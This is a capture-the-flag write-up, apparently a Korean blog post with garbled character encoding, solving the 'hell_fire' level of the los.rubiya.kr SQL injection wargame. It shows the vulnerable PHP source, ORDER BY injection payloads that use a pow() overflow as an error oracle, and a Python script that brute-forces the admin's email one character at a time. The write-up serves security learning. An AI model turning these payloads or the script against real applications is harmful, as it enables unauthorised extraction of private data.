---
title: "[LOS] 23ë²ˆ ë¬¸ì œ í’€ì´(hell_fire)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 23ë²ˆ
  - los hell_fire

  
toc: true
toc_sticky: true
toc_label: "23ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 23ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}



# 23ë²ˆ(hell_fire)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158282940-1337ec7e-8b07-48b7-84f5-744778543dc3.png)


```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

## í’€ì´
ì´ë²ˆ ë¬¸ì œëŠ” ì…ë ¥ ê°’ì´ order by ì ˆì— ì…ë ¥ì´ ë©ë‹ˆë‹¤. ì²˜ìŒì— ì‹œë„í•œ ë°©ë²•ì€ if(ì¡°ê±´ë¬¸,1,3) ë°©ì‹ìœ¼ë¡œ, ì¡°ê±´ë¬¸ì˜ ê²°ê³¼ê°€ ì°¸ì´ë©´ 1, ê±°ì§“ì´ë©´ 3ì´ ì¶œë ¥ë˜ê²Œ í•˜ì—¬ ì¡°ê±´ë¬¸ì˜ ê²°ê³¼ë¥¼ íŒë‹¨í•˜ë ¤ê³  í–ˆìŠµë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ order by 1ê³¼ 3ì˜ ê²°ê³¼ê°€ ë‹¤ë¥´ê¸° ë•Œë¬¸ì—, if ë¬¸ì„ ì´ìš©í•˜ë©´ ë  ê±°ë¼ ìƒê°í–ˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158283362-e98798e8-eed6-4411-b7f8-36bd1c8e084a.png)

---

![image](https://user-images.githubusercontent.com/33647663/158283384-49d90fc4-6ab1-43bd-9126-15be0fedeafa.png)



í•˜ì§€ë§Œ ì´ìœ ëŠ” ì˜ ëª¨ë¥´ê² ëŠ”ë°, order by ì ˆ ë’¤ì—ëŠ” ì„œë¸Œì¿¼ë¦¬ë‚˜, í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ê²°ê³¼ ê°’ê³¼ ìƒê´€ì—†ëŠ” ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ if(1=1,1,2) ë¼ê³  í•˜ë©´ 1ì´ ë°˜í™˜ë ê±°ë¼ ìƒê°í–ˆì§€ë§Œ, ì œê°€ ìƒê°í•˜ëŠ” ë°©ì‹ëŒ€ë¡œ ì²˜ë¦¬ë˜ì§€ ì•Šê³ , ê²°ê³¼ì™€ ìƒê´€ì—†ì´ ì¼ì •í•˜ê²Œ ì¶œë ¥ì´ ë©ë‹ˆë‹¤.
-> **if(1=1,1,2) ë‚˜ if(1=1,1000,2)ë‚˜ ì¶œë ¥ê²°ê³¼ê°€ ê°™ìŒ**

ê·¸ë˜ì„œ ì´ë²ˆ ë¬¸ì œë„ error based ë°©ì‹ìœ¼ë¡œ ì ‘ê·¼í•´ ë´¤ìŠµë‹ˆë‹¤.

ì°¨ì´ê°€ ë‚˜ëŠ” ì ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šìœ¼ë©´ ê²°ê³¼ê°€ ì¶œë ¥ë˜ê³ , ì„œë¸Œ ì¿¼ë¦¬ ë‚´ì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ ê²°ê³¼ê°€ ì¶œë ¥ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì´ì—ˆìŠµë‹ˆë‹¤.

1. order=(select 1 where if(1=1,1,pow(12341234,12341234)))

![image](https://user-images.githubusercontent.com/33647663/158284038-4d57481f-6e6f-4a0c-a519-fe46442ec390.png)

-> **ì¡°ê±´ë¬¸ì´ ì°¸ì¼ë•ŒëŠ”, 1ì´ ì„ íƒë˜ì–´ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì•„ì„œ í…Œì´ë¸”ì´ ì¶œë ¥ë©ë‹ˆë‹¤.**

2. order=(select 1 where if(1=2,1,pow(12341234,12341234)))

![image](https://user-images.githubusercontent.com/33647663/158284153-774f74ac-dde1-4c4e-b1ca-593fba8eab10.png)

-> **ì¡°ê±´ë¬¸ì´ ê±°ì§“ì¼ë•ŒëŠ”, pow(12341234,12341234)ê°€ ì„ íƒë˜ì–´ ì‹¤í–‰ë˜ê¸° ë•Œë¬¸ì— ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì—¬ í…Œì´ë¸”ì´ ì¶œë ¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.**

ì´ë¥¼ ì´ìš©í•œ error based blind sql ì½”ë“œì…ë‹ˆë‹¤.

```python
import requests
import string

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
params={'order' : None}
cookies = {'PHPSESSID' :'1t87momi7f10m7tl6kkv6t0lob' }

# ì´ë©”ì¼ ê¸¸ì´
for i in range(30):
    payload="(select 1 where if(id='admin' and length(email)={},pow(12341234,12341234),1))".format(i)
    params['order'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("rubiya805@gmail.cm" not in response.text):
        print("find the pw_length",i)
        break

# ì´ë©”ì¼ ê¸¸ì´ 28

email = ''
for i in range(1,29):
    for j in string.printable:
        payload="(select 1 where if(id='admin' and ascii(substr(email,{},1))={},pow(12341234,12341234),1))".format(i,ord(j))
        params['order'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("rubiya805@gmail.cm" not in response.text):
            email += j
            print("find the email",email)
            break

print(email)
```

![image](https://user-images.githubusercontent.com/33647663/158287577-ad9c44fe-0dc9-47e8-8a60-00ea4fc5820a.png)

![image](https://user-images.githubusercontent.com/33647663/158287614-dc4c60c0-8b7e-4948-b3e0-250e2c1d86d3.png)